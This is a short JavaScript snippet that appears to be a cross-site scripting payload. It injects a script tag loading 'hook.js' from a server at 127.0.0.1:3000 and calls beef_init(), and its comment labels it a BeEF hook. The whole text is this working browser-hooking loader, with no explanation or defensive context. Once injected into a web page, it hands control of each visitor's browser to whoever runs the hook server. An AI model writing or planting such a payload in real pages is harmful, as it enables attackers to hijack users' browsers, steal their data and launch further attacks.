(function() {
var d=document;
var s = d.createElement('script');
s.src = 'http://127.0.0.1:3000/hook.js'; // BeEF hook here
s.setAttribute('onload','beef_init();');
d.body.appendChild(s);
})();
